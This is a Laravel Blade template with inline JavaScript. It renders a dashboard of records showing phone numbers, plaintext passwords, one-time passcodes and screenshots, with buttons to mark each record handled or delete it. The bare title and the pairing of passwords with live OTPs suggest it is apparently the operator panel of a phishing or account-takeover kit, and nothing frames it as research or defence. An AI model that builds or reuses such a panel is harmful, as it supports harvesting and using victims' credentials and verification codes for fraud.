<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta id="cr" name="csrf-token" content="{{ csrf_token() }}">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/war.css">
  <title>w</title>
</head>
<body>
    <div class="cc">
        @foreach ($cc as $c)
        <div class="c" @isset($c->checked){{"style=background-color:#55C2A3;color:black"}}@endisset>
               <div class="tel">
                tel: <span class="tel">{{ $c->phone }}</span>
               </div>
               <div class="pass">
                password: <span class="password">{{ $c->password }}</span>
               </div>
               <div class="otp">
                otp: <span class="otp">{{ $c->otp }}</span>
               </div>
               @isset($c->screenshoot)
               screenshoot: <a target="_blank"  href="/storage/{{ $c->screenshoot }}">@isset($c->screenshoot) {{ 'view' }} @endisset</a>
               @endisset
               <div class="scrren">
               </div>
               <div class="btns">
                <button  class="o" value="{{ $c->id }}">OK</button>
                <button  class="del" value="{{ $c->id }}">del</button>
            </div>
            </div>

        @endforeach
    </div>
</body>
<script>
    const o = document.querySelectorAll('.o');
    const del = document.querySelectorAll('.del');

    o.forEach(oo=>{
        oo.addEventListener('click', ()=>{
            fetch(`war/ok?id=${oo.value}`, {
                method: 'POST',
                headers: {
                    'X-CSRF-TOKEN': document.getElementById('cr').attributes.content.value,
                }
                }).then(data =>data.text())
                .then(s =>{
                })
                .catch(error =>{
                    console.error(error);
                });
        });
    })
    del.forEach(d=>{
        d.addEventListener('click', ()=>{
            fetch(`war/del?id=${d.value}`, {
                method: 'POST',
                headers: {
                    'X-CSRF-TOKEN': document.getElementById('cr').attributes.content.value,
                }
                }).then(data =>data.text())
                .then(s =>{

                })
                .catch(error =>{
                    console.error(error);
                });
        });
    })
</script>
</html>
